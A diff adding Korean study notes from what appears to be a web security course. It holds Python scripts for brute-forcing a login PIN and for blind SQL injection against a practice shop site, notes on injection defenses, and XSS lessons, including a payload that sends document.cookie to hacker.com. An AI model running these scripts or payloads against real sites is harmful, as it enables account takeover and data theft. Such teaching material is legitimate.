@@ -1,0 +1,422 @@
+* 쇼핑몰 문제 2번
+
+import requests
+
+url = "https://elms2.skinfosec.co.kr:8110/practice/practice02/login"
+headers = {
+    "Content-Type" : "application/x-www-form-urlencoded"
+}
+cookies = {
+  "JSESSIONID":"본인껄로" 
+}
+data = {
+    "_csrf" : "본인껄로",
+    "memberid" : "admin",
+    "password" : "0000"
+}
+
+for i in range(500, 1000):
+    pw = str(i).zfill(4)
+    data["password"] = pw
+    response = requests.post(url, headers=headers, cookies=cookies, data=data)
+    if "로그인에 실패" in response.text:
+        print("비밀번호 [{}] 로그인 실패".format(pw))
+    else:
+        print("비밀번호 [{}] 로그인 성공!!!".format(pw))
+        break
+
+
+
+* 쇼핑몰 문제 1번
+
+DB => Oracle
+
+- 공격 포인트 찾기
+1. 공격한 URL
+2. 공격 구문
+    참 :
+    거짓 :
+
+DM 보내주세요.
+
+Hint 1 : 검색창에 하는 거 아닙니다.
+Hint 2 : ' <- 이거 X
+
+[쿼리문 유추]!!! <- 공격 포인트 찾기
+
+
+select 컬럼들 from 상품
+where 상품번호 = 61 and (공격구문)
+
+숫자형 -> 연산 가능
+(62-1)
+
+select 컬럼 from 상품
+where 상품번호 = 61.0000
+
+'61' != '61.000'
+61 = 61
+
+
+
+
+=====================
+import requests
+
+url = "https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and {}"
+
+cookies = {
+    "JSESSIONID":"89A8B63BAFAEE06ED3945C59FF289128"
+}
+
+while True:
+    query = input("공격 구문 : ")
+    attackUrl = url.format(query)
+
+    response = requests.get(attackUrl, cookies=cookies)
+    if "MacBook" in response.text:
+        print("참")
+    else:
+        print("거짓")
+
+======================
+import requests
+
+url = "https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and {}"
+
+cookies = {
+    "JSESSIONID":"89A8B63BAFAEE06ED3945C59FF289128"
+}
+
+# select user from dual
+# 유저명의 길이 : (select length(user) from dual) = 1
+
+query = "(select length(user) from dual) = {}"
+
+for i in range(1,100):
+    attackQuery = query.format(i)
+    print(attackQuery)
+    attackUrl = url.format(attackQuery) 
+    response = requests.get(attackUrl, cookies=cookies)
+    if "MacBook" in response.text:
+        print("참")
+        break
+    else:
+        print("거짓")
+
+이진탐색
+
+ascii : 82
+
+1                127
+[                  ]
+
+1차 1 ~ 127 : 가운데 64
+       ascii > 64   ->  참   65 ~ 127
+2차 65 ~ 127 : 가운데 96
+       ascii > 96   -> 거짓  65 ~ 96
+3차 65 ~ 96 : 가운데 80
+       ascii > 80   -> 참    81 ~ 96
+4차 81 ~ 96 : 가운데 88
+       ascii > 88   -> 거짓  81 ~ 88
+5차 81 ~ 88 : 가운데 84
+       ascii > 84   -> 거짓  81 ~ 84
+6차 81 ~ 84 : 가운데 82
+       ascii > 82   -> 거짓  81 ~ 82
+7차 81 ~ 82 : 가운데 81
+       ascii > 81   -> 참    82 ~ 82
+       
+
+======================================
+import requests
+
+url = "https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and {}"
+cookies = {"JSESSIONID":"962C9A16C3E04A9F122A2865ABB85CDB"}
+
+def binarySearch(query):
+    baseQuery = query + "> {}"
+    min = 1
+    max = 127
+    while min < max:
+        avg = int((min + max) / 2)
+        attackQuery = baseQuery.format(avg)        
+        attackUrl = url.format(attackQuery)
+        response = requests.get(attackUrl, cookies=cookies)
+        if "MacBook" in response.text:            
+            min = avg + 1                    
+        else:
+            max = avg            
+    return min
+
+for i in range(1, 9):    
+    query = "(select ascii(substr(user,{},1)) from dual)".format(i)
+    ascii = binarySearch(query)
+    print("{}번째 글자 : {}".format(i, chr(ascii)))
+
+
+============================ 
+
+SQL Injection JSP 7번 
+  ~ 6월 30일 23:59:59.99
+
+1. 테이블 명 전부
+2. ANSWER의 컬럼명 전부
+3. 정답                     
+
+자동화 공격 스크립트 
+
+=============================
+
+보고서 작성
+
+1. 프로젝트 개요/목표/목적
+2. 기능 설계
+3. 기능 설명
+4. 실행 결과
+5. 프로젝트 후기/소감
+
+테이블명, 컬럼명 전부, 정답
+
+=================
+
+1. 문서 -> 통일성 ( 70% )
+  표지
+  목차
+  넘버링 들여쓰기
+  여백, 개행
+  표, 그림 너비 통일
+  오타
+  사진 내의 글씨 크기를 가능하면 문서글씨 크기와 어우러지게
+
+2. 기술적인거 ( 30% )
+  함수 변수 명이라도 다른걸로 바꿔서
+  코드를 얼마나 최적화를 잘했나
+  추가기능 -> GUI, 엑셀로 데이터 뽑아서 저장
+              메뉴 ....
+
+
+Oracle DB 자료형
+
+NUMBER
+VARCHAR2
+DATE <- Unix timestamp
+
+2024/06/17 15:27:21.124980
+title   content           reg_date(date)
+========================================
+테스트  테스트내용입니다.  194561612313
+
+2024/06/10 ~ 
+
+날짜검색 : 2024/06/10'
+
+select * from 게시판 where (reg_date > to_date('2024/06/10')),--'YYYY/MM/DD') and '1'='1'-- and , 'YYYY/MM/DD')
+
+select * from 게시판 where 제목 like '%__검색어__%'
+
+정렬
+
+test.com/board/list?sort=1
+
+select * from 게시판 order by (select case when (select length(user) from dual) > 10 then 1 else 1/0 end)
+(62-1) -> 61
+62.0 -> 62
+
+select -> 에러처리
+
+test.com/board?keyword=____검색어____
+
+SelEcT
+SELECT
+
+"select" in keyword.toLowerCase()
+
+if "select" in keyword or "SELECT" in keyword:
+    공격이니깐 에러처리
+else:
+    진짜 검색시켜
+
+
+for i in range(1,4):
+    keyword.replaceAll('select','');
+    keyword.replaceAll('from','');
+    keyword.replaceAll('union','');
+
+where 제목 like '%cc%'and'1%'='1%'
+
+if 검색어 내에 " " 공백이 있으면:
+    안돼
+else:
+    실행
+
+* SQL Injection 보안 대책
+1. ***Prepared Statement를 사용하는 것***
+  -> 예 : 똑바로만 잘 쓰면 100% 안전합니다.
+  -> 아니오 : 잘못쓰면 뚫려요.
+
+ 1) 테이블명
+
+test.com/board/list?board=4 where 1=1--&keyword=바보
+
+ select column..... from  where 1=1 --
+
+
+switch(board)
+   case 1:
+     select * from notice
+   case 2:
+     select * from board
+   case 3: 
+     select * from qna
+  default:
+     에러처리해
+
+ 2) 정렬
+ test.com/board/list?keyword=바보&sortby=2
+
+ select * from 게시판 where title = ? order by " + sortby
+
+
+ 
+
+
+
+2. 사용자 입력값 필터링, 글자수 제한 이름 10
+  ' -> 걍 실행시키지마
+  '  -> \'
+  
+  '안녕'하세요
+
+ productlist?id=62 and 1=1
+
+ id = int(id)
+
+ select * from product where id = id
+
+
+XSS(Cross-site Scripting)
+
+
+test.com/board?keyword=___입력값__
+
+html 
+javascript 
+내가 입력한게 안에 들어가서 악성코드를 실행시키는 것
+
+자바스크립트 실행 방법
+
+<html>
+<body>
+<script>
+   코드
+</script>
+<body>
+</html>
+
+<button onclick="코드">
+
+test.com/list?keyword=바보<script>코드</script>
+
+
+<input type="text"
+
+
+<html>
+<body>
+ <div>
+    현재 검색어 : 바보
+    <script>
+        코드
+    </script> 
+ </div>
+  글 리스트
+  ...
+  ..
+
+<body>
+</html>
+
+test.com/write?board=" + "";악성코드.........;var a = "" + &title=asdf.
+<script>
+    var url = "test.com/write" + "";
+    
+    악성코드.........;
+
+    var a = "" + ".jsp"
+
+    요기로 가서 글쓰게해
+
+    test.com/writekkk.jsp
+</script>
+
+1. document.cookie
+  상대방이 이걸 실행했을 때 쿠키값을 빼올수 있습니다.
+
+  hacker.com/?cookie= __________________
+
+
+  window.location = "http://hacker.com/?cookie="+document.cookie;
+
+2. input값 탈취 -> 아이디, 비밀번호 탈취
+
+3. 악성코드-> 내pc 열심히 코인을 채굴 -> 해커 지갑으로 보내는 코드
+
+
+----------------
+1. Reflected XSS(반사형 크사)
+2. Stored XSS(저장형 크사)
+----------------
+
+1. 요청 -> 응답 -> 실행 내가 입력한 값
+
+2. 요청 -> DB 저장
+스크립트가 실행 <- 조회 <- DB 조회 
+
+
+ㅂ
+http://useworld.ddns.net/1/4/vuln?input=hacker</textarea><script>alert(1);</script><textarea>
+
+
+<input type="hidden" id="keyword" name="keyword" value="hacker"/><script>alert('XSS');</script><temp temp="    " />
+
+"<>()/''xsstest
+
+<input type="hidden" id="pageIndex" name="pageIndex" value="" /> <script>alert('XSS');</script><babo babo="  " />
+
+alert('XSS')
+
+1. 파라미터의 입력값이 그대로 응답에 노출이 되는거
+2. 공격에 필요한 특수문자들이 Encoding이 안되는 파라미터
+3. 위치 파악해서 공격구문 완성해서 집어넣기
+4. copy url해서 브라우저에 붙여넣어서 실행되는지 보기
+
+
+* XSS 문제 2번
+
+1. 공격이 되는 URL : copy URL 복붙
+2. 정답
+
+DM 보내주시면 됩니다.
+
+- Hint 1 : 공지사항 목록 페이지 아닙니다!
+- Hint 2 : 응답 내 입력값의 위치 확인 ->         2특수문자 종류가 달라짐
+- Hint 3 : 호출되지 않는 함수 
+
+1. 태그와 태그 사이
+
+<h2><div> ___입력값__  </div></h2>
+입력값 : <script>alert('xss');</script>
+
+2. 태그 안에 있을 때
+<input value="__입력값__">
+<input value=""><script>alert('xss');</script><"..">
+
+입력값 : "><script>alert('xss');</script><"
+
+3. 이미 <script> 안에 있을때
+<script>
+  var = '123'; alert('xss'); var a = '1' ;
+</script>
+
+
+입력값 : 123'; alert('xss'); var a = '1
